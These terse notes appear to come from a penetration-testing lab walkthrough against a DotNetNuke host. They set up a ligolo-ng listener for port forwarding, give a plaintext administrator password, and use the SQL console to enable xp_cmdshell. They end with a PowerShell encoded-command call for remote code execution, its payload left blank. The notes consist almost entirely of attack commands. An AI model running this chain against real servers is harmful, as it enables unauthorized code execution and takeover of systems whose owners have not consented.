- set up ligolong listener
```
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
```
- cred `Administrator:D0tn31Nuk3R0ck$$@123`
- go to `Settings -> SQL console`
- enable `xp_cmdshell`
```
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```
- Get powershell RCE
```
xp_cmdshell 'powershell -e '
```
